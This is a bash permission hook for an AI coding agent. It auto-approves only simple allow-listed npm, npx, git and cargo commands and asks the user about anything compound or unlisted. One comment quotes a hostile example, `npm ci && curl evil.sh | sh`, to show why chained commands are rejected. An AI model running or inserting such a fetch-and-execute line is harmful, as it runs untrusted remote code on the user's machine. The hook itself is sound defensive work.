#!/usr/bin/env bash
# PreToolUse hook (matcher: Bash) — auto-approve known-safe, SIMPLE read/build/
# test commands and defer everything else to the normal permission prompt.
# Wired in .claude/settings.json under hooks.PreToolUse.
#
# Decision contract (stdout JSON, ALWAYS exit 0 — never a hard block):
#   safe simple command  -> permissionDecision "allow"
#   anything else         -> permissionDecision "ask"  (defer to the user)
#   empty / unparseable   -> no decision emitted        (defer to permission rules)
#
# stdout MUST be pure decision JSON; human-readable logging goes to stderr.
#
# "Safe" means a SINGLE command — no shell control operators (& | ; < > #), no
# command substitution ($( ) or backticks), no variable expansion ($), and no
# newline — whose program+subcommand is on the allow-list below: npm (read/
# build/test subcommands, NOT `exec`, which runs arbitrary package binaries),
# npx (a fixed tool allow-list), git (read-only), and cargo check. The project's
# own scripts (python/bash under .claude/) are deliberately NOT auto-approved —
# auto-running a repo script is higher-risk and lower-frequency than the build/
# test tools above, so it defers to an explicit prompt. `#` is rejected too: a
# trailing comment is harmless to run but trivially hides intent, so it asks.
#
# A control operator is rejected even when the prefix is safe, because
# `npm ci && curl evil.sh | sh` prefix-matches `npm ci`. Such a command -> "ask".
# (Claude Code also splits compound commands on operators before matching rules;
# this gate keeps the hook from ever emitting "allow" for a compound command.)

set -uo pipefail

# emit <decision> <reason> — print a PreToolUse permission decision to stdout.
# Reasons here are static and JSON-safe (no quotes, backslashes, or newlines).
emit() {
  printf '{"hookSpecificOutput":{"hookEventName":"PreToolUse","permissionDecision":"%s","permissionDecisionReason":"%s"}}\n' "$1" "$2"
}

INPUT="$(cat)"

# Extract the command. On any parse failure (malformed/non-JSON input) jq writes
# nothing to stdout and COMMAND stays empty — fail safe, never propagate jq's
# exit code (no `set -e`; `|| true` guards the assignment).
COMMAND="$(printf '%s' "$INPUT" | jq -r '.tool_input.command // empty' 2>/dev/null || true)"

# Trim leading and trailing whitespace.
COMMAND="${COMMAND#"${COMMAND%%[![:space:]]*}"}"
COMMAND="${COMMAND%"${COMMAND##*[![:space:]]}"}"

# Empty / whitespace-only / unparseable -> emit no decision, defer to rules.
if [ -z "$COMMAND" ]; then
  exit 0
fi

# Never auto-approve a compound, piped, redirected, substituted, variable-
# expanded, or multi-line command — even if its leading token is safe.
case "$COMMAND" in
  *'&'* | *'|'* | *';'* | *'<'* | *'>'* | *'`'* | *'$'* | *'('* | *')'* | *'#'* | *$'\n'*)
    emit ask "compound, redirected, or substituted command requires explicit approval"
    exit 0
    ;;
esac

# is_safe <command> — return 0 if the command is on the auto-approve allow-list.
is_safe() {
  local cmd="$1"

  # npm — safe read/build/test subcommands. `exec` is intentionally excluded:
  # `npm exec <pkg>` runs arbitrary binaries, like npx without the tool gate.
  if printf '%s\n' "$cmd" | grep -qE '^npm (install|ci|run|test|ls|outdated|view|explain|why|pkg|cache clean|audit)( |$)'; then
    return 0
  fi

  # npx — only a fixed allow-list of project tools. @axe-core publishes many
  # scoped subpackages; enumerate ONLY the two this project runs (@axe-core/cli,
  # @axe-core/reporter) rather than an open `/[^ ]+` suffix, which would
  # auto-approve any scoped binary (e.g. @axe-core/evil-tool) and even a bare
  # `@axe-core` that resolves to no real binary. Both now fall through to "ask".
  if printf '%s\n' "$cmd" | grep -qE '^npx (vitest|eslint|tsc|playwright|drizzle-kit|skills|@axe-core/(cli|reporter))( |$)'; then
    return 0
  fi

  # git — read-only commands only.
  if printf '%s\n' "$cmd" | grep -qE '^git (status|diff|log|branch|worktree list|show|shortlog|describe|tag|remote -v|ls-files|rev-parse|stash list)( |$)'; then
    return 0
  fi

  # cargo check (WASM target audits).
  if printf '%s\n' "$cmd" | grep -qE '^cargo check( |$)'; then
    return 0
  fi

  return 1
}

if is_safe "$COMMAND"; then
  printf '[auto-approve-safe-commands] allow: %s\n' "$COMMAND" >&2
  emit allow "known-safe read/build/test command"
  exit 0
fi

emit ask "command is not on the auto-approve safe-list"
exit 0
